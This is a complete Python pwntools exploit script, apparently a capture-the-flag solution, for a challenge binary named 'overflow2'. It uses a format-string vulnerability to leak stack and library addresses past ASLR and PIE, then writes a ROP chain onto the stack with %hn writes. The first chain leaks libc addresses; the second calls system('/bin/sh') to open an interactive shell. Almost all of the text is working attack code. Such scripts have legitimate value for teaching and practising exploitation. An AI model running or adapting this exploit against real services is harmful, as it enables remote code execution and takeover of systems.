#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 14004 --libc ../../libc.so.6 ../src/overflow2.debug
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "../src/overflow2.debug")
context.terminal = ["alacritty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "localhost"
port = int(args.PORT or 14004)
libc = ELF("../../libc.so.6")


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
b main
b vuln
b show_suspects
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes

buffer_length = 0x30

# error codes
SOLVE_ERROR = 2  # failed to solve the challenge for some reason
SOLVE_FAILURE = 1  # solved the challenge, but didn't find the flag
SOLVE_OK = 0  # solve the challenge


def show_suspects(io: process | connect):
    io.sendline(b"3")
    io.recvuntil(b"> ", drop=True)


def exit_prog(io: process | connect):
    io.sendline(b"4")


def change_username(io: process | connect, payload: bytes) -> bytes:
    io.sendline(b"1")
    io.recvuntil(b"> ")  # which user?
    io.sendline(b"1")
    io.recvuntil(b"value: ")
    io.sendline(payload)
    return io.recvuntil(b"> ", drop=True)


def stack(io: connect | process, payload: bytes) -> bytes:
    _p = b"A" * (buffer_length + 16) + b"|"
    _p += payload
    return change_username(io, _p)


def leak_stack_contents(io: connect | process, vars: int, offset: int = 0) -> bytes:
    payload = ".".join([f"%{i + offset}$lx" for i in range(vars)])
    return stack(io, payload.encode("ascii"))


def stack_var(io: connect | process, index: int) -> bytes:
    return leak_stack_contents(io, 1, index)


def stack_var_int(io: connect | process, index: int) -> int:
    result = (
        leak_stack_contents(io, 1, index).split(b"|")[1].split(b"\n")[0].decode("ascii")
    )
    io.debug(f"stack index({index}) = {result}")
    return int(
        result,
        16,
    )


def write_stack(
    io: connect | process,
    _ptr_index: int,
    _gadget: int,
    _gadget_index: int,
    _payload: bytes,
):
    # _ptr_index (index) points to _gadget
    # _gadget (addr) is the address that gets overriden
    # _gadget_index (index) is the index of the gadget
    # the address of which _gadget points, gets set to _payload

    # error handling
    output = None

    packed = _payload  # new gadget
    shorts = [packed[i : i + 2] for i in range(0, len(packed), 2)]
    for i, short in enumerate(shorts):
        # calculate least sig. short of address
        to_write = (_gadget & 0xFFFF) + (i * 2)  # writing into fbuffer

        try:
            # logging
            output = io.debug(f"Writing {hex(to_write)} to ptr index {_ptr_index}")

            # overwrite the pointer
            stack(io, f"%{to_write - 1}c%{_ptr_index}$hn".encode("ascii"))

            # write to the gadget
            lss = unpack(short, "all") - 1

            # logging
            output = io.debug(f"Writing {hex(lss)} to gadget index {_gadget_index}")

            if lss >= 0:
                stack(io, f"%{lss}c%{_gadget_index}$n".encode("ascii"))

        except EOFError:
            io.error(f"Caught EOFError, received from server: {output}")
            return False

    # returning if it was successful
    return True


def write_stack_ptr(
    io: connect | process,
    _ptr_index: int,
    _gadget: int,
    _gadget_index: int,
    _payload: int,
):
    # _ptr_index (index) points to _gadget
    # _gadget (addr) is the address that gets overriden
    # _gadget_index (index) is the index of the gadget
    # the address of which _gadget points, gets set to _payload

    io.debug(
        f"Writing {hex(_payload)} to {hex(_gadget)}. {_ptr_index} points to {_gadget_index}"
    )
    write_stack(io, _ptr_index, _gadget, _gadget_index, pack(_payload))


# -- exploit --
def exploit() -> bool:
    io = start()
    io.recvuntil(b"> ")

    # need to calculate the stack addresses of my gadget
    # and my rbp gadget
    rsp = 0
    ptr = {"addr": 0, "index": 26}
    rbp = {"addr": 0, "index": ptr["index"] + 2}
    gadget = {"addr": 0, "index": ptr["index"] + 39}
    fbuffer = {
        "addr": 0,
        "index": 20,
    }  # actually starts at 18, but the new gadget pointer will live at 18

    # defeating ASLR
    _radd = stack_var_int(io, rbp["index"] + 1)
    exe.address = _radd - 287 - exe.sym["main"]
    assert (
        exe.address & 0x000000000FFF == 0
    ), f"Failed to obtain a proper base address, was {hex(exe.address)}"  # asserting lower bytes
    assert (
        exe.address & 0xFF0000000000 != 0
    ), f"Failed to obtain a proper base address, was {hex(exe.address)}"  # asserting the upper bytes
    assert (
        exe.address > 0 == 0
    ), f"Failed to obtain a proper base address, was {hex(exe.address)}"  # that second zero can't be True because Python is shit!
    io.success(f"Address of overflow2 @ {hex(exe.address)}")

    # leaking stack contents
    rsp = stack_var_int(io, ptr["index"] + 2) - 0x10 - 0x60
    rbp["addr"] = rsp + 0x60
    ptr["addr"] = stack_var_int(io, ptr["index"])

    # ensuring I can actually calculate rsp
    assert rsp == (ptr["addr"] - 312 - 64 - 0x10)  # for rsp

    # getting the address of our gadget
    gadget["addr"] = stack_var_int(io, gadget["index"])
    fbuffer["addr"] = rsp + 0x10 + 0x10

    ## testing to write to the gadget
    stack(io, f"%{0x40}c%{ptr['index']}$hn".encode("ascii"))
    test = stack_var_int(io, gadget["index"])
    assert gadget["addr"] != test, "address of gadget should have changed."
    assert test & 0xFFFF == 0x41, "address of gadget should have changed."

    # logging
    io.info(f"rsp is at {hex(rsp)}")
    io.info(f"rbp is at {hex(rbp['addr'])}")
    io.info(f"ptr->gadget is at {hex(ptr['addr'])}")
    io.info(f"flag buffer is at {hex(fbuffer['addr'])}")

    ## full exploit

    # creating our gadget
    try:
        root = rbp["addr"]
        io.info(f"Writing the gadget {hex(root)} onto the stack.")
        write_stack_ptr(io, ptr["index"], fbuffer["addr"], gadget["index"], root)
    except Exception:
        io.error(f"Couldn't write {hex(root)} to the stack, reattempting.")
        return SOLVE_ERROR

    # if this worked, then the contents of fbuffer should be an address
    expected = stack_var_int(io, fbuffer["index"])
    assert (
        root == expected
    ), f"Expected fbuffer to contain {hex(root)}, was {hex(expected)}"
    io.info(f"Wrote {hex(root)} to {hex(fbuffer['addr'])}")

    # need to make a new gadget ptr
    write_stack_ptr(
        io, ptr["index"], fbuffer["addr"] - 0x10, gadget["index"], fbuffer["addr"]
    )
    ptr["index"] = fbuffer["index"] - 2
    ptr["addr"] = fbuffer["addr"] - 0x10

    # if this worked, then the contents of fbuffer should be an address
    assert (fbuffer["addr"]) == stack_var_int(io, ptr["index"])
    io.info(f"Wrote {hex(fbuffer['addr'])} to {hex(ptr['addr'])}")

    # writing the rop chain now
    rop = ROP(exe)
    syms = ["fgets", "puts", "printf", "getchar", "exit"]
    addrs = {}
    rop.raw(rbp["addr"] + 0x20)
    for i, sym in enumerate(syms, 0):
        rop.puts(exe.got[sym])  # type: ignore

    # going back to main
    rop.raw(rop.rbp)
    rop.raw(rbp["addr"] + len(rop.chain()) + 0x18)
    rop.main()  # type: ignore

    # writing more stack rbps
    for i in range(10):
        rop.main()  # type: ignore
        rop.raw(rbp["addr"] + len(rop.chain()) + 0x10)

    # logging for fun
    io.info(rop.dump())
    # show_suspects(io) # gdb breakpoint

    # ropping the stack
    if not write_stack(io, ptr["index"], root, fbuffer["index"], rop.chain()):
        io.error("Failed to write the rop chain, retrying.")
        return SOLVE_ERROR
    # show_suspects(io) # gdb breakpoint

    # activate rop
    # io.info(leak_stack_contents(io, 70, 17).decode('ascii'))
    exit_prog(io)

    # leaking addresses
    raddrs = io.recvuntil(b"\nssh", drop=True)
    io.info(f"Leaked raddrs: {raddrs}")

    # parsing the leaked addrs
    addr_len = 6
    raddrs = list(raddrs)

    # For whatever reason, sometimes the program won't send the full
    # addresses. I don't know why, but duct tape fixes everything.
    if len(raddrs) != ((addr_len + 1) * len(syms)) - 1:
        io.error(
            f"Received bytes {len(raddrs)} expected {((addr_len + 1) * len(syms)) - 1}."
        )
        io.error("Reattempting solve.")

        return SOLVE_ERROR

    for sym in syms:
        # this is definitely not optimal, but I'm too lazy to implement a better way
        _raw = []
        # print(raddrs)
        for i in range(addr_len):
            _raw.append(raddrs.pop(0))
            # print(_raw)
        if len(raddrs) > 0:
            raddrs.pop(0)  # remove newline

        addrs[sym] = unpack(bytes(_raw).ljust(8, b"\0"))

    # confirming libc
    libc.address = addrs[syms[0]] - libc.sym[syms[0]]
    for sym in syms:
        io.success(
            f"{sym:10}@libc: {hex(libc.sym[sym])} == {sym:10}@leak: {hex(addrs[sym])}"
        )
        assert libc.sym[sym] == addrs[sym]

    # eating stdin
    io.recvuntil(b"> ")

    #
    ## ropping again!
    #

    # reset the vars
    rbp = {"addr": 0, "index": 28}
    ptr = {"addr": 0, "index": 30}
    gadget = {"addr": 0, "index": ptr["index"] + 2}
    fbuffer = {
        "addr": 0,
        "index": 20,
    }  # actually starts at 18, but the new gadget pointer will live at 18

    # leaking stack contents
    rsp = stack_var_int(io, rbp["index"]) - 0x10 - 0x60
    rbp["addr"] = rsp + 0x60
    ptr["addr"] = stack_var_int(io, ptr["index"])
    # show_suspects(io)  # gdb breakpoint

    # confirming that ptr is relative to rbp
    assert (
        rbp["addr"] == ptr["addr"] - 0x20
    ), f"{hex(rbp['addr'])} is not {hex(ptr["addr"])} - 0x20"

    # getting the address of our gadget
    gadget["addr"] = stack_var_int(io, gadget["index"])
    fbuffer["addr"] = rsp + 0x10 + 0x10

    ## testing to write to the gadget
    stack(io, f"%{0x40}c%{ptr['index']}$hn".encode("ascii"))
    test = stack_var_int(io, gadget["index"])
    assert gadget["addr"] != test, "address of gadget should have changed."
    assert test & 0xFFFF == 0x41, "address of gadget should have changed."

    # logging
    io.info(f"rsp is at {hex(rsp)}")
    io.info(f"rbp is at {hex(rbp['addr'])}")
    io.info(f"ptr->gadget is at {hex(ptr['addr'])}")
    io.info(f"flag buffer is at {hex(fbuffer['addr'])}")
    # show_suspects(io) # gdb breakpoint

    # creating our gadget
    root = rbp["addr"]
    write_stack_ptr(io, ptr["index"], fbuffer["addr"], gadget["index"], root)

    # if this worked, then the contents of fbuffer should be an address
    assert (root) == stack_var_int(io, fbuffer["index"])
    io.info(f"Wrote {hex(root)} to {hex(fbuffer['addr'])}")

    # need to make a new gadget ptr
    write_stack_ptr(
        io, ptr["index"], fbuffer["addr"] - 0x10, gadget["index"], fbuffer["addr"]
    )
    ptr["index"] = fbuffer["index"] - 2
    ptr["addr"] = fbuffer["addr"] - 0x10

    # if this worked, then the contents of fbuffer should be an address
    assert (fbuffer["addr"]) == stack_var_int(io, ptr["index"])
    io.info(f"Wrote {hex(fbuffer['addr'])} to {hex(ptr['addr'])}")
    # show_suspects(io)  # gdb breakpoint

    ## another rop chain!
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.raw(rop.ret)
    rop.system(next(libc.search(b"/bin/sh")))  # type: ignore

    # ropping the stack
    if not write_stack(io, ptr["index"], root, fbuffer["index"], rop.chain()):
        io.error("Failed to write the rop chain, retrying.")
        return SOLVE_ERROR
    # show_suspects(io)  # gdb breakpoint

    # activate the rop chain
    exit_prog(io)

    # enjoy your shell!
    io.interactive()
    return SOLVE_OK


if __name__ == "__main__":
    code = SOLVE_ERROR
    while code == SOLVE_ERROR:
        code = exploit()

        # cleanup (I didn't do this and it threw me for a fucking loop)
        exe.address = 0
        libc.address = 0
    exit(code)
